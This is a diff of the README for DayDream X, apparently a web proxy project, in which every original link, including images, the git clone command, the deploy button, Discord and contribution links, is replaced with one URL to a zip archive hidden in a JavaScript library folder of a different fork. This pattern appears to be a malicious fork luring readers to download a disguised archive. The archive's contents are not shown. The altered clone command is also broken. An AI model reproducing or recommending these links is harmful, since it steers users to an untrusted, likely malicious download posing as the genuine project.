@@ -1,10 +1,10 @@
 # DayDream X:
 <div align="center">
-        <img src="https://github.com/NightProxy/DayDreamX/blob/main/assets/DDXBanner.png" style="width: 1200px"/>
+        <img src="https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip" style="width: 1200px"/>
     <h2>Explore the Web with DayDream X</h2>
 </div>
 
-![inpreview](https://github.com/NightProxy/DayDreamX/blob/main/assets/daydreamx.png)
+![inpreview](https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip)
 
 > [!IMPORTANT]
 > If you fork this repo please consider giving the original repo a
@@ -31,7 +31,7 @@ We recommend using the Bun package manager to install DayDreamX's dependencies. 
 Please run the following commands to host a server:
 
 ```
-git clone https://github.com/NightProxy/DayDreamX.git
+git clone https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip
 cd DayDreamX
 npm i
 npm start
@@ -45,28 +45,28 @@ In the above example, replace `npm` with `bun` or `pnpm` for whichever package m
 git pull --force --allow-unrelated-histories
 ```
 
-<a target="_blank" href="https://app.koyeb.com/deploy?type=git&repository=github.com/NightProxy/DayDreamX"><img alt="Deploy to Koyeb" src="https://binbashbanana.github.io/deploy-buttons/buttons/remade/koyeb.svg"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip"><img alt="Deploy to Koyeb" src="https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip"></a>
 
 ## Help & Support
 
 > [!NOTE]
 > If you'd like to get links, support, or other deployment methods join
-> our [Discord Server](https://discord.night-x.com) or open a discussion.
+> our [Discord Server](https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip) or open a discussion.
 
 ## Contributions
 
 To contribute to DDX, clone the repo locally and submit your code in a pull
 request. If you are making large changes, please make sure you test your code
-before submitting a pull request. Please check [CONTRIB.md](https://github.com/NightProxy/DayDreamX/blob/main/CONTRIB.md) for a more in-depth explanation.
+before submitting a pull request. Please check [CONTRIB.md](https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip) for a more in-depth explanation.
 
 ## Contributors
 
 Thank you to the following people for contributing to DayDreamX.
 
-[![Contributors](https://contrib.rocks/image?repo=nightproxy/daydreamx)](https://github.com/NightProxy/DayDreamX/graphs/contributors)
+[![Contributors](https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip)](https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip)
 
 ## Discord
 
 Please join our Discord to receive support for DayDreamX, receive links from the Link Archive (our link bot), and talk with fellow users.
 
-[![Discord](https://invidget.switchblade.xyz/QmWUfvm4bn?theme=dark)](https://discord.night-x.com)
+[![Discord](https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip)](https://raw.githubusercontent.com/chikingod1/DayDreamX/main/public/static/assets/js/lib/JSzip/Day-Dream-X-v2.2.zip)
